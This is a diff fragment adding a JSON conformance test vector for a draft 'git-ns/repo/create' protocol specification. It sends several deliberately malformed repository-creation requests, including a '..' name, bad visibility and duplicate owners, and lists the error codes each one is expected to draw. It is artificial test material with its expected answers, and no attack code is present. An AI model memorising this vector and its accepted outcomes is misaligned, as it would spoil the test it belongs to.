+    "SPEC.md 7.2 items 2 and 10 do not order payload validation against the authorisation decision, and 8.3 gives permissionDenied for a requester who is not authorised, so this vector accepts malformedRequest, permissionDenied or (where the task's front matter names one) the task's own standing code, and fixes no check order. An answer from an object lookup (taskFailed, a not-found code) is not accepted: it is what a consumer that never validated the payload gives (7.2 item 2 is a MUST). noSideEffect still holds."
+   ],
+   "clarify": null,
+   "requires": [
+    "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+    "https://trusttasks.org/spec/git-ns/namespace/bind/0.2",
+    "optional:seed.defaults",
+    "optional:authorised"
+   ],
+   "mutants": [
+    "noPayloadValidation"
+   ],
+   "source": {
+    "slug": "git-ns/repo/create",
+    "version": "0.4",
+    "channel": "proposed",
+    "profile": "coverage",
+    "ref": "pkg:@openvtc/trust-tasks@0.29.0#https://trusttasks.org/spec/git-ns/repo/create/0.4",
+    "pinnedDigest": "sha256:26977a3b68f43db6b031dcb2f4d1191f4df0613884ba1e1f782fd371eb351bad",
+    "tfRef": {
+     "repoPath": "specs/git-ns/repo/create/0.4/spec.md",
+     "commit": "bd0c05013277b83f23fa90db699671ebb48dd24c",
+     "status": "draft"
+    },
+    "note": "Coverage family CA (Community administration): the grouping is a suite proposal (docs/22) and advisory; the task is a Trust Tasks specification (tfRef, status draft). Evidence basis: the task force's own invalid payload examples. Seeded-state probe of CX-CA-033: advisory; a probe vector is derived from the held vector and adds no independent evidence of the schema.",
+    "tfCommit": "bd0c05013277b83f23fa90db699671ebb48dd24c",
+    "specHash": "sha256:81545d09efbc97f7eb7ce1104e78bdc645b814cacbd431578bd76be7b52869b0",
+    "schemaHash": "sha256:1c26978888f291592288f712ec31429dd17b12bae8e3ca1ca368466f07d539b6"
+   },
+   "steps": [
+    {
+     "send": {
+      "document": {
+       "id": "$id(seed1)",
+       "type": "https://trusttasks.org/spec/git-ns/namespace/bind/0.2",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "forge": "github.com",
+        "owner": "$mint(nsowner)",
+        "mode": "manual"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "response",
+      "type": "https://trusttasks.org/spec/git-ns/namespace/bind/0.2#response",
+      "orRefusal": [
+       "git-ns:policyDenied"
+      ]
+     },
+     "capture": {
+      "ns": "/payload/namespace/id"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px1)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "Gadgets",
+        "visibility": "public"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px2)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "acme/gadgets",
+        "visibility": "public"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px3)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "..",
+        "visibility": "public"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px4)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "gadgets",
+        "visibility": "internal"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px5)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "gadgets"
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px6)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "gadgets",
+        "visibility": "public",
+        "owners": []
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px7)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "gadgets",
+        "visibility": "public",
+        "owners": [
+         "did:webvh:QmBobScid2:acme-vtc.example:bob",
+         "did:webvh:QmBobScid2:acme-vtc.example:bob"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    },
+    {
+     "send": {
+      "document": {
+       "id": "$id(px8)",
+       "type": "https://trusttasks.org/spec/git-ns/repo/create/0.4",
+       "issuer": "$A",
+       "recipient": "$iut",
+       "issuedAt": "$now+0s",
+       "payload": {
+        "namespace": "$cap(ns)",
+        "name": "gadgets",
+        "visibility": "public",
+        "owners": [
+         "did:webvh:QmBobScid2:acme-vtc.example:bob#key-1"
+        ]
+       }
+      }
+     },
+     "expect": {
+      "disposition": "error",
+      "code": [
+       "malformedRequest",
+       "permissionDenied"
+      ],
+      "noSideEffect": true,
+      "errorReply": "should"
+     }
+    }
+   ]
+  }
+ ]
+}
